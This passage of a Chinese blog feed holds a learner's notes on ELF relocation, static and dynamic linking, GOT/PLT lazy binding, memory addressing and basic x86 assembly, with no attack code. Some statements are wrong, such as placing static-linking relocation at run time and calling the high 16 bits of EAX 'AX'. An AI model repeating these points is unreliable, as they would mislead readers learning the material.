Name</code>列只是打印了所对应符号表条目中<code>Value</code>和<code>Name</code>列的值。</p></li><li><p>重定位类型指示链接器如何修改该符号引用的值。重定位类型因不同的处理器而异。</p></li></ul></li><li><p><code>Addend</code>是 Relocation Entry 结构体中的第 3 个字段，占用 8 字节，表示一个有符号常数，一些重定位类型要使用它对被修改符号引用的值做<strong>偏移调整</strong>。</p></li></ul><h1 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h1><h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><blockquote><p>静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成链接到一块生成可执行程序。这里的库指的是静态链接库，Windows下以<code>.lib</code>为后缀，Linux下以<code>.a</code>为后缀。</p></blockquote><p>若程序使用静态链接方式，则程序所有代码都将集成到同一个二进制文件中，其优点在于无依赖关系，可以在不同运行环境的OS下运行。</p><p>但是缺点也十分明显，由于二进制文件中包含全部代码，所以所占空间较大；如果多次运行同一个程序，则OS可能会对某个库函数进行多次重复 的加载，占用了不必要的内存；若某个公用的库函数产生了更新，则需要重新编译所有使用了该库的程序，工作量较大。</p><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul><li>代码装载速度快，执行速度略比动态链接库快；</li><li>只需保证在开发者的计算机中有正确的.lib文件，在以二进制形式发布程序时不需考虑在用户的计算机上.lib文件是否存在及版本问题。</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用静态链接生成的可执行文件体积较大，包含一些重复相同的代码，造成内存空间的浪费。</li></ul><h4 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h4><p>动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是动态链接库，Windows下以<code>.dll</code>为后缀，Linux下以<code>.so</code>为后缀。</p><p>在Windows下的动态链接也可以用到.lib为后缀的文件，但这里的<code>.lib</code>文件叫做导入库，是由<code>.dll</code>文件生成的。</p><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ul><li><p>生成的可执行文件较小；</p></li><li><p>适用于大规模的软件开发，使开发过程相对独立，耦合度减小，便于不同的开发者和开发组织之间进行开发和测试；</p></li><li><p>不同编程语言编写的程序只要按照函数调用约定就可以调用同一个DLL函数；</p></li><li><p>DLL文件与EXE文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性</p></li></ul><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用动态链接库的应用程序不是自完备的，它依赖的DLL模块也要存在，如果使用载入时动态链接，程序启动时发现DLL不存在，系统将终止程序并给出错误信息；</li><li>速度比静态链接慢</li></ul><h1 id="GOT与PLT"><a href="#GOT与PLT" class="headerlink" title="GOT与PLT"></a>GOT与PLT</h1><p>为了支持动态链接这一工作过程，在<code>.elf</code>文件中有四个section与之相关：</p><ul><li><code>.got</code> ：全局偏移表（Global Offset Table），用于存储外部符号的绝对地址即运行时符号的真实地址，由链接器进行填充，包含动态链接的函数的地址。</li><li><code>.plt</code>：过程链接表（Procedure Linkage Table），就是一小段跳转指令，存有从<code>.got.plt</code>中查找外部函数地址的代码，若是第一次调用该函数，则会触发链接器解析函数地址并填充在<code>.got.plt</code>相应的位置；若函数地址已经存储在<code>.got.plt</code>中则直接跳转到对应地址继续执行。</li><li><code>.got.plt</code>：是plt的got。它包含返回.plt去触发查找的地址，或者是一个经过查找后填充的正确符号地址。</li><li><code>.plt.got</code>：不知道干啥用的……</li></ul><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>因为静态链接中的重定位工作全部在运行时完成，且当我们引用了某一个库，程序将会对其中的所有函数和全局变量进行重定位，这种情况下，链接的动态库越大链接的时间就越长，系统的启动时间就越长。</p><p>为了解决这一问题，延迟绑定的概念被提出。延迟绑定规定只有符号真正被引用时才会进行重定位，而不是在刚开始就对所有的动态符号进行重定位。</p><p>延迟绑定由plt来实现，在elf文件中，plt表和got表几乎时时刻刻伴随着<del>（这是可以嗑的吗是可以的吗）</del>。</p><p>在got表中，前三项内容不对应符号的引用，分别对应：</p><ul><li>got[0]：当前的elf文件中.synamic段的地址</li><li>got[1]：保留</li><li>got[2]：动态链接器的符号解析函数</li></ul><p>其余的项被用作符号重定位，对于外部函数(即外部跳转)的 got 表项而言，在编译阶段保存的是 .plt 表的起始位置，对于数据引用的 plt 表项而言，编译阶段的值为 0。</p><p>plt 的作用是为每一次模块外部的函数调用设置一小段跳转代码。在 arm 编译器的实现中，对于每一项外部跳转，对应 plt 中三条指令。和 got 类似，plt 的前面部分也被系统”征用”了，这部分负责调用动态链接器中的符号解析函数完成动态解析工作，后续的部分才是对应具体外部跳转的指令。</p><p>在程序的编译阶段，plt 跳转指令表项和 got 表项就实现了绑定，其映射关系为：plt 第一段跳转指令对应 got 第四个表项，plt 第二段跳转指令对应 got 第五个表项，以此类推。</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-33-10.png"></p><p>🌰：<br>对于一个c语言文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world1!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world2!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对其进行编译后查看其main函数的反汇编结果</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_16-58-54.png"></p><blockquote><p>%rip是一个指针，此处相当于寄存器相对寻址</p></blockquote><p>在<code>0x40054d</code>调用了<code>0x400430&lt;puts@plt&gt;</code>，当程序rip到400340时，需要执行的操作对应的汇编代码为：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-00-02.png"></p><hr><p>陆陆续续把基础的小零碎学完啦！🥳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理地址，虚拟地址和逻辑地址</title>
    <link href="/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>关于物理地址，虚拟地址和逻辑地址的定义和之间的关系</p><span id="more"></span><p>虽然写了这么多知识点但脑袋还是乱乱的，希望哪天突然开窍叭🥱</p><h3 id="理解内存"><a href="#理解内存" class="headerlink" title="理解内存"></a>理解内存</h3><p>我们平时使用的各种数据都是存储在硬盘等存储器上，但硬盘的运行速度很慢。所以需要运行程序或者使用数据时，这些数据必须从硬盘上转到另一种容量小但速度快很多的存储器，之后才送进CPU进行处理。这中间的存储器就是内存。</p><p>无论何种存储器，软盘、硬盘、光盘或者内存，都有地址。</p><p>其中：</p><ul><li>我们程序所使用的内存地址叫做<strong>虚拟内存地址</strong>（<em>Virtual Memory Address</em>）</li><li>实际存在硬件里面的空间地址叫<strong>物理内存地址</strong>（<em>Physical Memory Address</em>）。</li></ul><h1 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h1><p><strong>物理地址就是常说的内存地址，是内存当中存储数据的一个标识，并不是数据本身，通过内存地址可以找到内存当中存储的数据。</strong></p><p>计算机将内存划分为一个个小的内存单元，同时对其编号，这样就能有效管理内存。在空间划分实践中，一个<strong>内存单元</strong>的大小为1<strong>字节</strong>。一个字节是八个比特，相当于八个二进制位，两个十六进制位。</p><blockquote><p>可以理解为一栋叫内存的楼，每一套商品房都有自己的门牌号叫内存单元，每一个家庭是一个数据，每一位家庭成员所居住的小房间则不会进行编号。</p></blockquote><p>每个内存单元都有编号（内存编号），内存编号可以称为<strong>地址</strong>，在<code>C</code>语言中也称为<strong>指针</strong>。</p><h5 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a>🌰</h5><p>在内存中存储”修饰符“或”MOD“，可以示意为：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-28_20-14-36.png"></p><p>![]&#x2F;img&#x2F;物理地址，虚拟地址和逻辑地址&#x2F;Snipaste_2023-03-28_20-23-49.png)</p><blockquote><p>数字后面加H表示十六进制</p></blockquote><p>在第一行中，每一格表示一段内存，而格子里的内容是这段内容记下的数据；第二行中每一格内数字就是对应的内存的地址。</p><p>汉字在一个地址空间里储存不下，会放进两个连续的地址空间里。而字母或者阿拉伯数字就可以放进一个内存地址里。在上图中，”修“的内存地址为1000H，或者M的内存地址为”1000H”。</p><h1 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h1><p>虚拟存储器不是任何实际的物理存储器，而是借助磁盘等辅助存储器来扩大主存容量，使之为更大或更多的程序所使用。</p><p><strong>虚拟地址用于指示虚拟存储器的地址，它是用逻辑地址指示的</strong></p><p>在程序运行时，我们需要将进程与物理地址映射起来，才能区分这些内存中存储的数据属于哪个进程。但内存大小有限，进程却可以很多，甚至可能同时进行多个进程。为了实现让很多进程共用一个存储资源有限的内存，我们引出虚拟地址的概念，我们先将进程与虚拟地址映射起来，再将虚拟地址与物理地址映射起来。</p><p>操作系统引入了虚拟内存，进程持有的虚拟地址会通过 CPU 芯片中的内存管理单元（MMU）的映射关系，来转换变成物理地址，然后再通过物理地址访问内存，如下图所示：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-0204ff048148735a260fa5f94f475f14_r.png"></p><h1 id="逻辑地址"><a href="#逻辑地址" class="headerlink" title="逻辑地址"></a>逻辑地址</h1><p>逻辑地址，就是指机器语言指令中用来指定一个操作数或一条指令的地址，<strong>由一个段(segment)和偏移量(offset)组成</strong>，说地直白点就是CPU拿到的地址。</p><p>段号：用来查找段的起始地址，它被存储在段寄存器当中</p><p>偏移地址：是存储单元的物理地址与所在起始段的差值</p><h1 id="各种内存的关系"><a href="#各种内存的关系" class="headerlink" title="各种内存的关系"></a>各种内存的关系</h1><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/bba9443a9c0249ffa501df86649ce5d8.png"></p><h2 id="虚拟地址和物理地址"><a href="#虚拟地址和物理地址" class="headerlink" title="虚拟地址和物理地址"></a>虚拟地址和物理地址</h2><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>程序是由若干个逻辑分段组成的，如可由代码分段、数据分段、栈段、堆段组成。不同的段是有不同的属性的，所以就用分段（Segmentation）的形式把这些段分离出来。</p><p>分段机制下的虚拟地址由两部分组成，<strong>段选择子</strong>和<strong>段内偏移量</strong>。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><h4 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h4><p>段选择子保存在寄存器里。段选择子最重要的是段号，用作段表的索引。段表里保存的是这个段的基地址、段的界限和特权等级等。</p><p>段选择子是十六位的，其中十四位表示地址信息</p><h4 id="段偏移量"><a href="#段偏移量" class="headerlink" title="段偏移量"></a>段偏移量</h4><p>偏移量定义为：把存储单元的<strong>实际地址</strong>与其所在段的<strong>段地址</strong>之间的距离称为段内偏移，也称为“有效地址”或“偏移量”。</p><p>虚拟地址中的段偏移量应该位于0和段界限之间。如果段内偏移量是合法的，就将其段及地址加到段内偏移量得到物理内存地址。</p><p>分段机制会把程序的虚拟地址分成 4 个段，每个段在段表中有一个项，在这一项找到段的基地址，再加上偏移量，于是就能找到物理内存中的地址。</p><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ul><li>内存碎片</li></ul><p>举例来说。假设我们现在占有 1G 的物理内存，用户执行了多个程序，游戏占用了 512MB 内存，浏览器占用了 128MB 内存，音乐占用了 256 MB 内存。</p><p>这个时候，我们关闭浏览器，则空闲内存还有 1024 - 512 - 256 &#x3D; 256MB。但如果这个 256MB 不是连续的，被分成了两段 128 MB 内存，这就会导致没有空间再打开一个 200MB 的程序。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><p>这里的内存碎片的问题共有两处地方：</p><p>外部内存碎片，也就是产生了多个<strong>不连续</strong>的小物理内存，导致新的程序无法被装载；</p><p>内部内存碎片，程序所有的内存都被装载到了物理内存，但是这个程序有部分的内存可能并不是很常使用，这也会导致<strong>内存的浪费</strong></p><ul><li>内存交换效率低</li></ul><p>对于外部内存碎片的问题，我们采用内存交换的解决措施。</p><p>可以把音乐程序占用的那 256MB 内存写到硬盘上，然后再从硬盘上读回来到内存里。不过再读回的时候，我们不能装载回原来的位置，而是紧紧跟着那已经被占用了的 512MB 内存后面。这样就能空缺出连续的 256MB 空间，于是新的 200MB 程序就可以装载进来。</p><p>对于多进程的系统来说，用分段的方式，内存碎片是很容易产生的，产生了内存碎片，那不得不重新重新规划内存区域，这个过程会产生性能瓶颈。</p><p>因为硬盘的访问速度要比内存慢太多了，每一次内存交换，我们都需要把一大段连续的内存数据写到硬盘上。</p><p>所以，<strong>如果内存交换的时候，交换的是一个占内存空间很大的程序，这样整个机器都会显得卡顿。</strong></p><h3 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h3><p>为了解决内存分段的内存碎片和内存交换效率低的问题，就出现了内存分页。<strong>分页是把整个虚拟和物理内存空间切成一段段固定尺寸的大小</strong>。这样一个连续并且尺寸固定的内存空间，我们叫<strong>页</strong>（<em>Page</em>）</p><p>虚拟地址与物理地址之间通过页表来映射：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-e63c20d1bace757600fccb051a29eaf6_720w.webp"></p><p>页存储在内存里，由CPU的内存管理单元即MMU负责映射转换的工作吗，这样CPU 就可以直接通过 MMU，找出要实际要访问的物理内存地址。</p><p>由于内存空间都是预先划分好的，也就不会像分段会产生间隙非常小的内存。采用了分页，那么释放的内存都是以页为单位释放的，也就不会产生无法给进程使用的小内存。</p><p>如果内存空间不够，操作系统会把其他正在运行的进程中的「最近没被使用」的内存页面给释放掉，也就是暂时写在硬盘上，称为<strong>换出</strong>（<em>Swap Out</em>）。一旦需要的时候，再加载进来，称为<strong>换入</strong>（<em>Swap In</em>）。所以，一次性写入磁盘的也只有少数的一个页或者几个页，不会花太多时间，内存交换的效率就相对比较高。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-23f19a580a47fa6c731b32d7df6b6735_720w.webp"></p><p>在分页机制下，虚拟地址分为两部分，<strong>页号</strong>和<strong>页内偏移</strong>。页号作为页表的索引，<strong>页表</strong>包含物理页每页所在<strong>物理内存的基地址</strong>，这个基地址与页内偏移的组合就形成了物理内存地址</p><h4 id="其他东西"><a href="#其他东西" class="headerlink" title="其他东西"></a>其他东西</h4><p>再来，为了解决简单分页产生的页表过大的问题，就有了<strong>多级页表</strong>，它解决了空间上的问题，但这就会导致 CPU 在寻址的过程中，需要有很多层表参与，加大了时间上的开销。于是根据程序的<strong>局部性原理</strong>，在 CPU 芯片中加入了 <strong>TLB</strong>，负责缓存最近常被访问的页表项，大大提高了地址的转换速度。</p><hr><p>冲浪冲到的，我觉得比起枯燥的文字，这个更好理解</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-29_21-54-52.png"></p><hr><p>之前觉得自己很牛直接开始做题，靠一些老本还是能做几道题，但最近发现偏移量和内存地址啥的根本不会看也不会算，还是老老实实打基础叭😳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86汇编基础</title>
    <link href="/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>32bit的x86汇编基础，包括一些常规指令，内存和寻址模式</p><span id="more"></span><p>总觉得学了又好像没学······</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><img src="/img/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86-registers.png"></p><p>现代 x86 处理器有 8 个 32 bit 寄存器，如上图所示。</p><p>寄存器名字是早期计算机历史上流传下来的。</p><ul><li>EAX：一般用作累加器(Accumulator)</li><li>EBX：一般用作基址寄存器(Base)</li><li>ECX：一般用来计数(Count)</li><li>EDX：一般用来存放数据(Data)</li><li>ESI：一般用作源变址(Source Index)</li><li>EDI：一般用作目标变址(Destinatin Index)</li><li>ESP：一般用作堆栈指针(Stack Pointer)</li><li>EBP：一般用作基址指针(Base Pointer)</li></ul><p>现在大部分寄存器的名字已经失去了原来的意义，但有两个是例外：<strong>栈指针寄存器（Stack Pointer）ESP 和基址寄存器（ Base Pointer）EBP</strong>。</p><p>对于 <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> 四个寄存器，可以再将 32bit 划分成多个子寄存器， 每个子寄存器有专门的名字。例如 <code>EAX</code> 的高 16bit 叫 <code>AX</code>（去掉 E, 据说E表示 Extended）,低 8bit 叫 <code>AL</code> (Low）, 8-16bit 叫 <code>AH</code> （High）。</p><p>在汇编语言中，这些寄存器的名字是<strong>大小写无关</strong>的，既可以用 <code>EAX</code>，也可以写 <code>eax</code>。</p><h1 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h1><h3 id="程序重定位"><a href="#程序重定位" class="headerlink" title="程序重定位"></a>程序重定位</h3><ul><li>存放程序的为代码段，存放数据的为数据段</li><li>真实的内存单元地址称为物理地址，而程序中的地址为逻辑地址</li></ul><p>由于程序并不知道自己会被加载到哪，因此访存如果用绝对地址将会出错，在执行程序时就需要<strong>程序重定位</strong>这个操作。</p><p>该操作在汇编中通过<code>org</code>指令实现，如<code>org 0A100h</code>代表该程序中的所有标号都以<code>0A100h</code>做偏移。</p><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>将内存分段后，程序只需要识别偏移地址就可以确定数据位置。程序重定位通过设置代码段CS寄存器和数据段DS寄存器实现。</p><p>在8086中，地址总线是20位的，需要将段寄存器左移4位（<code>0x10h</code>，相当于16进制左移1位）变为20位，然后再同偏移地址相加。</p><p>两种典型情况</p><ul><li>因为段寄存器是16位的，在段不重叠的情况下，最多可以将1MB的内存分成65536个段，每个段16B，偏移地址从<code>0000H</code>到<code>000FH</code></li><li>同样在不允许段之间重叠的情况下，因为偏移地址也是16位，1MB的内存最多只能划分成16个段，每段长64KB，段地址由<code>0000H</code>到<code>F000H</code></li></ul><h3 id="声明静态数据区"><a href="#声明静态数据区" class="headerlink" title="声明静态数据区"></a>声明静态数据区</h3><p><code>.DATA</code>：声明静态存储区</p><p>数据类型修饰语：</p><p><code>DB/db</code>：Byte,1Byte</p><p><code>DW/dw</code>：Word,2Byte</p><p><code>DD/dd</code>：Double Word,4Bytes</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.DATA<br>var     DB 64    ; 声明一个 byte 值, referred to as location var, containing the value 64.<br>var2    DB ?     ; 声明一个未初始化 byte 值, referred to as location var2.<br>        DB 10    ; 声明一个没有 label 的 byte 值, containing the value 10. Its location is var2 + 1.<br>X       DW ?     ; 声明一个 2-byte 未初始化值, referred to as location X.<br>Y       DD 30000 ; 声明一个 4-byte 值, referred to as location Y, initialized to 30000.<br></code></pre></td></tr></table></figure><p><strong>在汇编中只有一维数组</strong>，没有二维和多维数组。一维数组其实就是内存中的一块连续区域。<code>DUP</code> 和字符串常量也是声明数组的两种方法。</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Z       DD 1, 2, 3      ; 声明 3 个 4-byte values, 初始化为 1, 2, and 3. The value of location Z + 8 will be 3.<br>bytes   DB 10 DUP(?)    ; 声明 10 个 uninitialized bytes starting at location bytes.<br>arr     DD 100 DUP(0)   ; 声明 100 个 4-byte words starting at location arr, all initialized to 0<br>str     DB &#x27;hello&#x27;,0    ; 声明 6 bytes starting at the address str, 初始化为 hello and the null (0) byte.<br></code></pre></td></tr></table></figure><h3 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h3><p>有多个指令可以用于内存寻址。如果要访问某一大小的内存，则通过添加修饰词<code>byte</code>、<code>word</code>、<code>dword</code>实现。</p><p>🌰：</p><p>其中<code>MOV</code> 将在内存和寄存器之间移动数据，接受两个参数：第一个参数是目的地，第二个是源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov byte[ebx], 2<br></code></pre></td></tr></table></figure><h3 id="函数调用-call-堆栈组织"><a href="#函数调用-call-堆栈组织" class="headerlink" title="函数调用(call)堆栈组织"></a>函数调用(call)堆栈组织</h3><h4 id="Caller规则"><a href="#Caller规则" class="headerlink" title="Caller规则"></a>Caller规则</h4><ol><li>在调用函数&#x2F;子程序(subroutine)之前，先保存特定寄存器的状态(caller-saved)（包括<code>eax</code>、<code>ecx</code>、<code>edx</code>）</li><li>将要传的参数堆栈（注意要逆序，<strong>最后一个参数最先入</strong>）。因为栈往下生长，因此第一个参数会被存在最低的地址</li><li>调用函数，<code>call</code>会将返回地址<code>eip</code>压入栈中</li><li>返回时先把参数移出栈，然后将原来保存的寄存器再pop出来</li></ol><h4 id="Callee规则"><a href="#Callee规则" class="headerlink" title="Callee规则"></a>Callee规则</h4><ol><li><p>将<code>ebp</code>推入栈，将<code>esp</code>的值拷贝入<code>ebp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp, esp<br></code></pre></td></tr></table></figure></li><li><p>分配局部变量，栈由上向下增长，如分配3个4B，则<code>sub esp, 12</code></p></li><li><p>保存寄存器状态</p></li></ol><h1 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h1><p>机器指令通常分为三类：数据移动、算术&#x2F;逻辑和控制流。</p><p>接下来的符号解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;reg32&gt; ; 任何32位寄存器 （EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP）<br>&lt;reg16&gt;; 任何16位寄存器 （AX, BX, CX, or DX）<br>&lt;reg8&gt;; 任何8位寄存器 （AH, BH, CH, DH, AL, BL, CL, or DL）<br>&lt;reg&gt;; 任何寄存器<br>&lt;mem&gt;; 一个内存地址 （e.g., [eax], [var + 4], or dword ptr [eax+ebx]）<br>&lt;con32&gt;; 任何32位常量<br>&lt;con16&gt;; 任何16位常量<br>&lt;con8&gt;; 任何8位常量<br>&lt;con&gt;; 任何8、16、32位常量<br></code></pre></td></tr></table></figure><h2 id="数据移动"><a href="#数据移动" class="headerlink" title="数据移动"></a>数据移动</h2><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov指令将第二操作对象（寄存器、内存内容或是常量值）所引用的数据项复制到其第一操作对象（寄存器或是内存）所引用的位置。</p><p>寄存器到寄存器的移动是合法的，但是直接内存到内存的移动是不合法的。在需要内存传输的情况下，必须首先将源内存中的内容加载到寄存器中，然后才能将其存储到目标内存地址。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov &lt;reg&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;mem&gt;<br>mov &lt;mem&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;const&gt;<br>mov &lt;mem&gt;,&lt;const&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax, ebx ; 将EBX中的值复制到EAX<br>mov byte ptr [var], 5 ; 将5存储到地址var的一个字节中<br></code></pre></td></tr></table></figure><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>ESP（堆栈指针）通过push递减。</p><p>push指令将其操作对象放在内存中硬件支持堆栈的顶部。具体地说，PUSH首先将ESP递减4，然后将其操作对象放入内存地址[ESP]处的32位大小的区域中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push &lt;reg32&gt;<br>push &lt;mem&gt;<br>push &lt;con32&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax ; 将eax入栈<br>push [var] ; 将地址var处开始的4个字节入栈<br></code></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>pop指令将4字节数据元素从硬件支持的堆栈顶部移至指定的操作对象（即寄存器或内存位置）。它首先将位于内存位置[SP]的4个字节移动到指定的寄存器或内存位置，然后将SP递增4。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop &lt;reg32&gt;<br>pop &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop edi ; 将堆栈的顶部元素弹出到EDI中<br>pop [ebx] ; 将堆栈的顶部元素弹出到内存从EBX位置开始的四个字节中<br></code></pre></td></tr></table></figure><h4 id="lea"><a href="#lea" class="headerlink" 